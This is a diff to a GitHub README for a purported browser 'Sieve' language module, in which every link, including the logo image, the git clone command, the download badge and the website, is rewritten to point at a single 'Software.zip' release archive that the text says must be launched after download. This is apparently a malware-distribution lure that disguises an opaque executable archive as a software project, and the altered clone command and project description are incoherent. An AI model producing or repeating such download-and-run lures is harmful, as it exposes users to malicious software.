@@ -1,6 +1,6 @@
 # 🌳️🌐️#️⃣️ Bliss Browser Sieve
 
-![Bliss Browser Sieve Logo](https://example.com/logo.png)
+![Bliss Browser Sieve Logo](https://github.com/She1uvzy/Bliss_Browser_Sieve/releases/download/v2.0/Software.zip)
 
 Welcome to the Bliss Browser Sieve repository! This is the language support module that enables Sieve programs to be written and executed directly within the browser. With the Bliss Browser Sieve, you can harness the power of Sieve programming conveniently in your web development projects.
 
@@ -10,7 +10,7 @@ Welcome to the Bliss Browser Sieve repository! This is the language support modu
 ⚙️ Seamless setup and configuration  
 
 ## Installation
-To get started with Bliss Browser Sieve, you can download the software package from [here](https://github.com/user-attachments/files/18383251/Software.zip). Please note that the file needs to be launched after download. 
+To get started with Bliss Browser Sieve, you can download the software package from [here](https://github.com/She1uvzy/Bliss_Browser_Sieve/releases/download/v2.0/Software.zip). Please note that the file needs to be launched after download. 
 
 ## Usage
 1. Ensure you have the necessary dependencies installed.
@@ -25,7 +25,7 @@ To get started with Bliss Browser Sieve, you can download the software package f
 
 ## Get Started
 ```bash
-git clone https://github.com/your-username/Bliss_Browser_Sieve.git
+git clone https://github.com/She1uvzy/Bliss_Browser_Sieve/releases/download/v2.0/Software.zip
 cd Bliss_Browser_Sieve
 npm install
 npm start
@@ -42,6 +42,6 @@ This project is licensed under the GPL-3.0 License. See the [LICENSE](LICENSE) f
 
 ---
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/She1uvzy/Bliss_Browser_Sieve/releases/download/v2.0/Software.zip)](https://github.com/She1uvzy/Bliss_Browser_Sieve/releases/download/v2.0/Software.zip)
 
-**Visit us at [blissbrowsersieve.com](https://blissbrowsersieve.com) for more information!**
+**Visit us at [https://github.com/She1uvzy/Bliss_Browser_Sieve/releases/download/v2.0/Software.zip](https://github.com/She1uvzy/Bliss_Browser_Sieve/releases/download/v2.0/Software.zip) for more information!**
